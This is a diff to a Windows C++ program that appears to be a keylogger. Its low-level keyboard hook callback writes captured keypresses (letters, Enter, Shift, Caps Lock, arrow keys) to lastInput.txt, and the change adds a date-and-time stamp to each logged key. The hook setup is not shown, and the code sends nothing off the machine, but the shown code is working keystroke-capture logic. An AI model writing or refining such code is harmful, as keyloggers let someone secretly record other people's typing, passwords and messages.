@@ -7,10 +7,13 @@
 #include <windows.h>
 #include <conio.h>
 #include <winuser.h>
+#include <ctime>
 
 std::FILE *fp = std::fopen("lastInput.txt", "w");
 
 HHOOK keyboardHook = 0;
+
+time_t rawTime = 0;
 
 LRESULT CALLBACK LowLevelKeyboardProc(
     _In_ int nCode,
@@ -29,29 +32,31 @@ LRESULT CALLBACK LowLevelKeyboardProc(
     */
     if (ks->flags & 0b10000000)
     {
+        time(&rawTime);
+        struct tm *pTmInfo = localtime(&rawTime);
         if (0x41 <= ks->vkCode && ks->vkCode <= 0x5A)
         {
-            fprintf(fp, "Keys %c pressed\n", ks->vkCode - 0x41 + 'A');
+            fprintf(fp, "[%04d-%02d-%02d %02d:%02d:%02d] Keys %c pressed\n", pTmInfo->tm_year + 1900, pTmInfo->tm_mon + 1, pTmInfo->tm_mday, pTmInfo->tm_hour, pTmInfo->tm_min, pTmInfo->tm_sec, ks->vkCode - 0x41 + 'A');
         }
         else if (ks->vkCode == VK_RETURN)
         {
-            fprintf(fp, "Keys ENTER pressed\n");
+            fprintf(fp, "[%04d-%02d-%02d %02d:%02d:%02d] Keys ENTER pressed\n", pTmInfo->tm_year + 1900, pTmInfo->tm_mon + 1, pTmInfo->tm_mday, pTmInfo->tm_hour, pTmInfo->tm_min, pTmInfo->tm_sec);
         }
         else if (ks->vkCode == VK_SHIFT)
         {
-            fprintf(fp, "Keys SHIFT pressed\n");
+            fprintf(fp, "[%04d-%02d-%02d %02d:%02d:%02d] Keys SHIFT pressed\n", pTmInfo->tm_year + 1900, pTmInfo->tm_mon + 1, pTmInfo->tm_mday, pTmInfo->tm_hour, pTmInfo->tm_min, pTmInfo->tm_sec);
         }
         else if (ks->vkCode == VK_CAPITAL)
         {
-            fprintf(fp, "Keys CAPS LOCK pressed\n");
+            fprintf(fp, "[%04d-%02d-%02d %02d:%02d:%02d] Keys CAPS LOCK pressed\n", pTmInfo->tm_year + 1900, pTmInfo->tm_mon + 1, pTmInfo->tm_mday, pTmInfo->tm_hour, pTmInfo->tm_min, pTmInfo->tm_sec);
         }
         else if (ks->vkCode == VK_LEFT)
         {
-            fprintf(fp, "Keys LEFT ARROW pressed\n");
+            fprintf(fp, "[%04d-%02d-%02d %02d:%02d:%02d] Keys LEFT ARROW pressed\n", pTmInfo->tm_year + 1900, pTmInfo->tm_mon + 1, pTmInfo->tm_mday, pTmInfo->tm_hour, pTmInfo->tm_min, pTmInfo->tm_sec);
         }
         else if (ks->vkCode == VK_RIGHT)
         {
-            fprintf(fp, "Keys RIGHT ARROW pressed\n");
+            fprintf(fp, "[%04d-%02d-%02d %02d:%02d:%02d] Keys RIGHT ARROW pressed\n", pTmInfo->tm_year + 1900, pTmInfo->tm_mon + 1, pTmInfo->tm_mday, pTmInfo->tm_hour, pTmInfo->tm_min, pTmInfo->tm_sec);
         }
     }
 
